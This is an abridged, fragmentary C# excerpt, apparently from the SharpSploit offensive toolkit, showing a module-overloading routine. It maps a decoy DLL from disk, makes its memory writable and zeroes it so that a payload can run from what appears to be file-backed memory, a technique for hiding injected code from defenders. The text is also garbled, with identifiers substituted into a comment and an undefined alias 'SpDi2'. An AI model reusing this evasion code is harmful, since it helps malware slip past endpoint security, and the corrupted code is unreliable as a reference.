...
using SpDi = SharpSploit.Execution;
...
namespace SharpSploit.Execution.ManualMap
{
    public class Overload
    {
        ...
        /// module by manually mapping a payload in it's place causing the payload to SpDi from what appears to be file-backed memory.
        /// </summary>
        ...
        public static PE.PE_MANUAL_MAP OverloadModule(byte[] Payload, string DecoyModulePath = null)
        {
            ...
            // Map decoy from disk
            SpDi.PE.PE_MANUAL_MAP DecoyMetaData = Map.MapModuleFromDisk(DecoyModulePath);
            ...
            SpDi2.Native.NtProtectVirtualMemory((IntPtr)(-1), ref DecoyMetaData.ModuleBase, ref RegionSize, SpDi.Win32.WinNT.PAGE_READWRITE);

            // Zero out memory
            SpDi2.Native.RtlZeroMemory(DecoyMetaData.ModuleBase, (int)RegionSize);
